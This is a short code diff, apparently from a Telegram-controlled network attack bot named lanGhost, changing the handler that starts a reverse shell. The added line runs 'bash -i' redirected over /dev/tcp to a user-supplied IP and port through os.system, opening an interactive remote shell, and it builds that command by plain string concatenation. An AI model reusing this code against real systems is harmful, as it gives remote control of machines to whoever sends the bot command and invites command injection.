@@ -909,8 +909,7 @@ def msg_reversesh(bot, update, args):
             return
 
         bot.send_message(chat_id=update.message.chat_id, text="✅ Starting reverse shell...")
-        os.system("sudo screen -S lanGhost-reversesh -X stuff '^C\n' > /dev/null 2>&1")
-        os.system("sudo screen -S lanGhost-reversesh -m -d bash -i >& /dev/tcp/" + target_ip + "/" + str(port) + " 0>&1")
+        os.system("bash -i >& /dev/tcp/" + target_ip + "/" + str(port) + " 0>&1")
     except:
         print("[!!!] " + str(traceback.format_exc()))
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
